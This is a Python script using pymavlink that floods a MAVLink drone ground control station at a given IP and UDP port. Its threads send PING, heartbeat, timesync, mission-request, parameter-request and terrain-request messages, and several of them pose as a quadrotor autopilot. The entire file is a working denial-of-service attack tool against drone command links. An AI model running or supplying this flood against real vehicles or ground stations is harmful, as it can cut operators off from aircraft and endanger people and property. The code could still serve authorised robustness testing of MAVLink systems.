# flood_mavlink_link.py

import threading

from pymavlink import mavutil
import time
import sys
import time

def ping_flood_worker(target_ip, target_port, stop_event, rate_hz=1):
    # Setup connection
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=1, source_component=1)
    print(f"Connected. Starting PING flood at {rate_hz} messages/sec...")

    interval = 1 / rate_hz
    seq = 0
    
    while not stop_event.is_set():
        try:
            # MAVLink PING message (ID #4)
            # time_usec: current system time in microseconds
            # seq: incrementing sequence number
            # target_system/component: 0 for a general ping request
            sock.mav.ping_send(
                int(time.time() * 1e6), # time_usec
                seq,                    # ping sequence number
                0,                      # target_system (0 = broadcast/request)
                0                       # target_component
            )
            
            seq = (seq + 1) % 256 # Keep sequence within 1-byte range if needed
            print(f"[+] Flooding PING (seq {seq})")
            
            time.sleep(interval)
        except Exception as e:
            print(f"Error sending: {e}")
            break

def heartbeat_flood_worker(target_ip, target_port, stop_event, rate_hz=1000):
    mav = mavutil.mavlink.MAVLink(None)
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=1, source_component=1)
    # sock.wait_heartbeat()
    print(f"Connected. Starting flood at {rate_hz} messages/sec...")

    interval = 1 / rate_hz
    
    while not stop_event.is_set():
        try:
            msg = mav.heartbeat_encode(
                type=mavutil.mavlink.MAV_TYPE_GENERIC,
                autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                base_mode=0,
                custom_mode=0,
                system_status=mavutil.mavlink.MAV_STATE_ACTIVE
            )
            sock.mav.send(msg)
            print("[+] Flooding heartbeat")
            time.sleep(interval)
        except Exception:
            pass

def timesync_flood_worker(target_ip, target_port, stop_event, rate_hz=1):
    # Establish connection as System 2, Component 2
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=1, source_component=1)
    
    print(f"Connected. Starting TimeSync flood at {rate_hz} messages/sec...")
    interval = 1 / rate_hz
    
    while not stop_event.is_set():
        try:
            # TIMESYNC message (ID #111)
            # tc1: Time sync timestamp 1 (nanoseconds). 
            # When sending a request, ts1 is usually the current time and tc1 is 0.
            now_ns = int(time.time() * 1e9)
            
            sock.mav.timesync_send(
                tc1=0,          # Remote system sets this on reply
                ts1=now_ns      # Local system timestamp
            )

            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                0, 0, 0
            )
            
            print(f"[+] Sent TimeSync request: {now_ns} ns")
            time.sleep(interval)
        except Exception as e:
            print(f"[-] Error: {e}")
            break


import time
from pymavlink import mavutil

def mission_request_worker(target_ip, target_port, stop_event, rate_hz=200):
    # Establish connection as System 1, Component 1 (Acting as the Drone)
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=1, source_component=1)
    
    print(f"Connected. Sending MISSION_REQUEST_INT at {rate_hz} Hz...")
    interval = 1 / rate_hz
    seq_counter = 0

    while not stop_event.is_set():
        try:
            # Heartbeat (Identifies itself as a Quadrotor to the GCS)
            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                mavutil.mavlink.MAV_STATE_ACTIVE, 0, 0
            )
            # MISSION_REQUEST_INT (Message #385)
            # This is the drone asking the GCS for a specific waypoint
            sock.mav.mission_request_int_send(
                target_system=255,      # Typically 255 for GCS
                target_component=230,     # Component ID
                seq=seq_counter        # The index of the waypoint the drone wants
                # mission_type=mavutil.mavlink.MAV_MISSION_TYPE_MISSION
            )

            
            print(f"[+] Drone requested waypoint index: {seq_counter}")
            
            # Increment sequence to simulate "pulling" a full mission
            seq_counter += 1 
            time.sleep(interval)
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break


def param_flood_worker(target_ip, target_port, stop_event, rate_hz=1):
    """
    Floods the GCS with PARAM_REQUEST_LIST messages.
    Forces the GCS to parse requests and initiate a full parameter broadcast.
    """
    # Connect to the GCS. 
    # We identify as System 1 (the Autopilot) so the GCS thinks it needs to sync.
    sock = mavutil.mavlink_connection(
        f'udpout:{target_ip}:{target_port}', 
        source_system=2, 
        source_component=2
    )
    
    print(f"[!] Starting Parameter Request flood targeting {target_ip}:{target_port}")
    print(f"[!] Rate: {rate_hz} Hz")

    interval = 1 / rate_hz

    while not stop_event.is_set():
        try:
            # MAVLink PARAM_REQUEST_LIST (ID #21)
            # target_system: The ID of the GCS (usually 255 or 0 for broadcast)
            # target_component: Usually 0
            sock.mav.param_request_list_send(
                255, 
                230
            )
            
            # We also send a heartbeat to keep the "connection" alive in the GCS UI
            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                0, 0, 0
            )

            time.sleep(interval)
            
        except Exception as e:
            print(f"[-] Flood Error: {e}")
            break

    print("[+] Parameter flood stopped.")


import time
from pymavlink import mavutil

def terrain_flood_worker(target_ip, target_port, stop_event, rate_hz=60):
    # Establish connection (System 1, Component 1)
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=1, source_component=1)
    
    print(f"Connected. Starting Terrain Request flood at {rate_hz} Hz...")
    interval = 1 / rate_hz

    while not stop_event.is_set():
        try:
            # Coordinates must be in 1E7 format (same as MISSION_ITEM_INT)
            # Example: 47.3667, 8.5500
            lat_int = 473667000 
            lon_int = 85500000
            
            # bitmask: Which of the 8x4 blocks we are requesting (usually all bits set)
            mask = 0xFFFFFFFF 

            # TERRAIN_REQUEST (Message #133)
            sock.mav.terrain_request_send(
                lat=lat_int,
                lon=lon_int,
                grid_spacing=30,   # Meters (Standard SRTM spacing)
                mask=mask          # Bitmask of requested 4x4 blocks
            )

            # Essential: Send Heartbeat so GCS knows where to send the data back
            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                mavutil.mavlink.MAV_STATE_ACTIVE, 0, 0
            )
            
            print(f"[+] Requested terrain data for: {lat_int}, {lon_int}")
            time.sleep(interval)

        except Exception as e:
            print(f"[-] Error: {e}")
            break

def mavlink_flood(target_ip="192.168.13.14", target_port=14550, rate_hz=1, threads=1, message="ping", duration=60, execution_record=None):
    if execution_record:
        execution_record["arguments"] = {
            "target_ip": target_ip,
            "target_port": target_port,
            "rate_hz": rate_hz,
            "threads": threads,
            "duration": duration
        }
    print(f"Starting mavlink flood on {target_ip}:{target_port} with {rate_hz} Hz rate...")
    stop_event = threading.Event()
    thread_list = []
    
    for _ in range(threads):
        if message == "heartbeat":
            t = threading.Thread(target=heartbeat_flood_worker, args=(target_ip, target_port, stop_event))
        elif message == "param_request":
            t = threading.Thread(target=param_flood_worker, args=(target_ip, target_port, stop_event))
        elif message == "timesync_request":
            t = threading.Thread(target=timesync_flood_worker, args=(target_ip, target_port, stop_event))
        elif message == "mission_request":
            t = threading.Thread(target=mission_request_worker, args=(target_ip, target_port, stop_event))
        elif message == "terrain_request":
            t = threading.Thread(target=terrain_flood_worker, args=(target_ip, target_port, stop_event))
        else:
            t = threading.Thread(target=ping_flood_worker, args=(target_ip, target_port, stop_event))
        t.daemon = True
        t.start()
        thread_list.append(t)

    time.sleep(duration)    
    stop_event.set()
    for t in thread_list:
        t.join(timeout=1)
    print("\nStopping flood.")

if __name__ == "__main__":
    # if len(sys.argv) != 3:
    #     print("Usage: python flood_mavlink_link.py <ip:port> <rate_hz>")
    #     sys.exit(1)

    # ip, port = sys.argv[1].split(":")
    # flood_mavlink(ip, int(port), float(sys.argv[2]))
    mavlink_flood(message="heartbeat", duration=30)
